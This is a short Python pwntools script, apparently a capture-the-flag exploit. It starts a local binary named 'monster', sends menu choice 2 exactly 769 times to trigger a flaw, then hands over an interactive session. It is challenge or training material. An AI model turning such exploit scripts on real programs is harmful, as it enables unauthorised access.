from pwn import *

r = process('./monster')
raw_input("debug")

for i in range(769):
	r.sendlineafter("Your choice> ", "2")

r.interactive()
r.close()

# Da xong